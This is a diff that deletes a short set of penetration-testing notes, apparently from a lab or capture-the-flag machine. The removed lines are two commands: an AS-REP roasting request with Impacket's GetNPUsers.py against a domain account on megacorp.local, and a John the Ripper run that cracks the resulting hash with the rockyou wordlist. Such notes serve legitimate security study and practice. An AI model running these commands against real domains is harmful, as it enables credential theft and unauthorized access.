@@ -1,8 +1,0 @@
-
-
-Get Kerberos TGT ticket:
-GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
-
-vim hash
-
-john hash -wordlist=/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
